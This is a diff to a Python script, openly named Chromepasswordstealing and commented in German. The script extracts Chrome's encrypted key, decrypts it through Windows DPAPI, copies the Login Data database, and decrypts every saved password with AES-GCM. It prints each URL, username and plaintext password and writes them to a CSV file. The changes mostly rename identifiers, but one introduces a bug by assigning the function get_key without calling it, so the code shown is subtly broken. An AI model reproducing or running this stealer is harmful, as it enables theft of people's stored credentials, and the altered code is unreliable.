@@ -11,24 +11,24 @@ import shutil
 import csv
 
 def Chromepasswordstealing():
-    CHROME_PATH_LOCAL_STATE = os.path.normpath(
+    Chrome_Path_Local = os.path.normpath(
         r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
-    CHROME_PATH = os.path.normpath(
+    Chrome_Path = os.path.normpath(
         r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))
 
-    def get_secret_key():
+    def get_key():
         try:
             # (1) Holen Sie den geheimen Schlüssel aus dem lokalen Chrome-Status.
-            with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
+            with open(Chrome_Path_Local, "r", encoding='utf-8') as f:
                 local_state = f.read()
                 local_state = json.loads(local_state)
-            secret_key = base64.b64decode(
+            key = base64.b64decode(
                 local_state["os_crypt"]["encrypted_key"])
             # Suffix DPAPI entfernen
-            secret_key = secret_key[5:]
-            secret_key = win32crypt.CryptUnprotectData(
-                secret_key, None, None, None, 0)[1]
-            return secret_key
+            key = key[5:]
+            key = win32crypt.CryptUnprotectData(
+                key, None, None, None, 0)[1]
+            return key
         except Exception as e:
             print("%s" % str(e))
             print("[ERR] Chrome secretkey cannot be found")
@@ -40,7 +40,7 @@ def Chromepasswordstealing():
     def generate_cipher(aes_key, iv):
         return AES.new(aes_key, AES.MODE_GCM, iv)
 
-    def decrypt_password(ciphertext, secret_key):
+    def decrypt_password(ciphertext, key):
         try:
             # (3-a) Initialisierungsvektor für die AES-Entschlüsselung
             initialisation_vector = ciphertext[3:15]
@@ -48,7 +48,7 @@ def Chromepasswordstealing():
             # Verschlüsseltes Passwort ist 192 Bits
             encrypted_password = ciphertext[15:-16]
             # (4) Erstellen Sie die Chiffre zur Entschlüsselung des Chiffretextes.
-            cipher = generate_cipher(secret_key, initialisation_vector)
+            cipher = generate_cipher(key, initialisation_vector)
             decrypted_pass = decrypt_payload(cipher, encrypted_password)
             decrypted_pass = decrypted_pass.decode()
             return decrypted_pass
@@ -58,10 +58,10 @@ def Chromepasswordstealing():
                 "[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
             return ""
 
-    def get_db_connection(chrome_path_login_db):
+    def get_db_connection(Chrome_Path_login_db):
         try:
-            print(chrome_path_login_db)
-            shutil.copy2(chrome_path_login_db, "Loginvault.db")
+            print(Chrome_Path_login_db)
+            shutil.copy2(Chrome_Path_login_db, "Loginvault.db")
             return sqlite3.connect("Loginvault.db")
         except Exception as e:
             print("%s" % str(e))
@@ -74,16 +74,16 @@ def Chromepasswordstealing():
             csv_writer = csv.writer(decrypt_password_file, delimiter=',')
             csv_writer.writerow(["index", "url", "username", "password"])
             # (1) Get secret key
-            secret_key = get_secret_key()
+            key = get_key
             # Benutzerprofil oder Standardordner durchsuchen (dort ist das verschlüsselte Anmeldekennwort gespeichert)
             folders = [element for element in os.listdir(
-                CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
+                Chrome_Path) if re.search("^Profile*|^Default$", element) != None]
             for folder in folders:
                 # (2) Abrufen des Chiffriertextes aus der Sqlite-Datenbank
-                chrome_path_login_db = os.path.normpath(
-                    r"%s\%s\Login Data" % (CHROME_PATH, folder))
-                conn = get_db_connection(chrome_path_login_db)
-                if(secret_key and conn):
+                Chrome_Path_login_db = os.path.normpath(
+                    r"%s\%s\Login Data" % (Chrome_Path, folder))
+                conn = get_db_connection(Chrome_Path_login_db)
+                if(key and conn):
                     cursor = conn.cursor()
                     cursor.execute(
                         "SELECT action_url, username_value, password_value FROM logins")
@@ -95,7 +95,7 @@ def Chromepasswordstealing():
                             # (3) Filterung des Initialisierungsvektors und des verschlüsselten Passworts aus dem Chiffretext.
                             # (4) Entschlüsseln des Passworts mit dem AES-Algorithmus
                             decrypted_password = decrypt_password(
-                                ciphertext, secret_key)
+                                ciphertext, key)
                             print("Sequence: %d" % (index))
                             print("URL: %s\nUser Name: %s\nPassword: %s\n" %
                                   (url, username, decrypted_password))
